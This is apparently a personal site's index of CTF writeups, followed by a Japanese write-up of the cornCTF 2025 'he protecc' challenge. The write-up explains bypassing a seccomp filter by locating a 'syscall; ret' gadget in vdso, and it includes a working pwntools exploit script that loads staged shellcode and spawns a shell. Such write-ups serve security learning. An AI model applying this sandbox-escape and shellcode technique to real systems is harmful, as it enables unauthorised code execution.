---
layout: page
title: CTF Writeups
nav_order: 3
description: "Collection of CTF competition writeups"
permalink: /writeups/
has_children: true
---

# CTF Writeups

This section contains writeups for various Capture The Flag (CTF) competitions I've participated in. These documents explain my approach, techniques used, and solutions for various security challenges.

## Available Writeups

- [SECCON 2022](/writeups/SECCON)
- [TSG LIVE 9 CTF](/writeups/TSG_LIVE_9)
- [ASIS CTF 2023](/writeups/ASIS_CTF_2023)
- [vsCTF 2023](/writeups/vsCTF2023)
- [DEFCON Quals 2024](/writeups/DEFCON-quals-2024)
- [SECCON 2024 Quals](/writeups/SECCON-quals-2024)
- [SECCON 2024 Final](/writeups/SECCON-final-2024)
- [AlpacaHack Round 10](/writeups/AlpacaHack-Round-10)
- [TsukuCTF 2025](/writeups/TsukuCTF2025)
- [IERAE CTF 2025](/writeups/IERAE_CTF_2025)

## Misc Writeups

### cornCTF 2025

#### he protecc

バイナリが渡される。
`READ | WRITE| EXEC` な領域が、固定アドレス`0x500000`に取られ、任意のコードを書き込み実行できる。

```plaintext
      0x400000           0x401000 r--p     1000      0 protected
      0x401000           0x4a2000 r-xp    a1000   1000 protected
      0x4a2000           0x4ca000 r--p    28000  a2000 protected
      0x4ca000           0x4cf000 r--p     5000  ca000 protected
      0x4cf000           0x4d1000 rw-p     2000  cf000 protected
      0x4d1000           0x4d7000 rw-p     6000      0 [anon_004d1]
      0x4d7000           0x4f9000 rw-p    22000      0 [heap]
      0x500000           0x501000 rwxp     1000      0 [anon_00500]
0x7ffff7ff7000     0x7ffff7ffb000 r--p     4000      0 [vvar]
0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000      0 [vvar_vclock]
0x7ffff7ffd000     0x7ffff7fff000 r-xp     2000      0 [vdso]
0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]
```

しかし、SECCOMPによってあらゆるシステムコールが禁止されている。

```plaintext
 0000: 0x20 0x00 0x00 0x00000008  A = instruction_pointer
 0001: 0x01 0x00 0x00 0x003fffff  X = 4194303 # 0x3fffff
 0002: 0x2d 0x00 0x0a 0x00000000  if (A <= X) goto 0013
 0003: 0x01 0x00 0x00 0x004b7fff  X = 4947967 # 0x4b7fff
 0004: 0x2d 0x00 0x07 0x00000000  if (A <= X) goto 0012
 0005: 0x01 0x00 0x00 0x004fffff  X = 5242879 # 0x4fffff
 0006: 0x2d 0x00 0x06 0x00000000  if (A <= X) goto 0013
 0007: 0x01 0x00 0x00 0x00500fff  X = 5246975 # 0x500fff
 0008: 0x2d 0x00 0x03 0x00000000  if (A <= X) goto 0012
 0009: 0x20 0x00 0x00 0x0000000c  A = instruction_pointer >> 32
 0010: 0x01 0x00 0x00 0x00007fff  X = 32767   # 0x7fff
 0011: 0x2d 0x00 0x01 0x00000000  if (A <= X) goto 0013
 0012: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

システムコールが実行可能なのは`vdso`領域ぐらいだが、ここには

```
0x0000000000000fad: syscall; ret;
```

こんなガジェットがある。また、`vdso`のベースアドレスは`_dl_sysinfo_dso`からリークできる。

ただ、`vdso`はカーネルによって異なるので、シェルコード内で該当の命令を探し、それをガジェットとして使う。

```bash
$ asm -c amd64 'syscall; ret'
0f05c3
```

あとはいい感じに飛べば良い。

<details>
<summary>
exploit.py
</summary>
from typing import List, Any, Dict
import time
from pwn import context, gdb, ELF, shellcraft, tube, pack, unpack, log, process, p64, p32, SigreturnFrame, ROP, asm, disasm, remote
from libpwncof import PayloadBuffer, LabelRef, create_ucontext

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "debug"
# context.log_level = "info"

path = "./protected"
elf = ELF(path)
context.binary = elf

# io: tube = gdb.debug(path)
# io: tube = remote('he-protecc.challs.cornc.tf', 1337, ssl=True)
io: tube = process(path)
# io: tube = remote("127.0.0.1", 10000)

# -1f05c3: syscall; ret

code = f"""
    mov r15, [{elf.symbols['_dl_sysinfo_dso']}]

check:
    cmp byte ptr [r15 + 0], 0x0f
    jne fail
    cmp byte ptr [r15 + 1], 0x05
    jne fail
    cmp byte ptr [r15 + 2], 0xc3
    jne fail

    jmp found

fail:
    inc r15
    jmp check

found:
    mov rdi, 0x501000
    mov rsi, 0x1000
    mov rdx, 0x7
    mov r10, 0x22
    mov r8, 0xffffffff
    mov r9, 0
    mov rax, 9
    call r15

    mov rdi, 0
    mov rsi, 0x501000
    mov rdx, 0x1000
    mov rax, 0
    call r15

    mov r15, 0x501000
    jmp r15
"""

a = asm(code)

io.recvuntil("How")
io.sendline(str(len(a)).encode())

io.send(a)

time.sleep(1)
code2 = shellcraft.sh()
a = asm(code2)

io.send(a)
time.sleep(1)

io.interactive()
</details>
